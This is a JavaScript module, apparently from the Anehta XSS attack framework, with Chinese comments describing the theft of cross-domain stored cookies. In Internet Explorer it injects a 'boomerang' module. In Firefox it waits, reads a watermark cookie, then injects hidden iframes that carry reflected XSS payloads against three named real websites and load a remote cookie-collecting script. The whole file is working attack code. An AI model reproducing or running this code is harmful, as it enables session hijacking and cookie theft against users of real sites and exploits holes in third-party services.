//alert("xcookie.js");
///////////////////////////////////////////////////
//// 偷取跨域 Stored Cookies //////////////////////
//// Author: axis
//// boomerang/gifar/flash/iframe//////////////////
///////////////////////////////////////////////////

if ( anehtaBrowser.type() == "msie" ){
	//IE最好只通过回旋镖模块获取一次
	anehta.inject.addScript(BoomerangMod);
	
} else if ( anehtaBrowser.type() == "mozilla" ){ 
  
  // 增加水印支持
  setTimeout(function(){
  	// 尝试获取cookie中的水印
  	var frameMark;
    frameMark = anehta.dom.getCookie("anehtaWatermark");  	
	  var target_url = new Array( // 远程xss trigger; 这里只在远程加载clxmod以获取cookie.
	                       "http://www.gobolinux.org/?page=<script src="+ClxMod+"></script>"+"&anehtaWatermark="+frameMark,
	                       "http://www.underwoodlandcompany.com/?pg=asdf<script src="+ClxMod+"></script>"+"&anehtaWatermark="+frameMark,
	                       "http://www.waikikicondosearch.com/?pg=asdf<script src="+ClxMod+"></script>"+"&anehtaWatermark="+frameMark
	                       );
	  
	  
	  // 因为mozilla/firefox 的iframe,img 不拦截stored cookie
	  // 所以可以直接利用这些标签
	  $.each(target_url, function(){
	  	//alert(this);
	  	anehta.inject.injectIframe(this);	
	  	}
	  	);	
	  },
	  3000);
}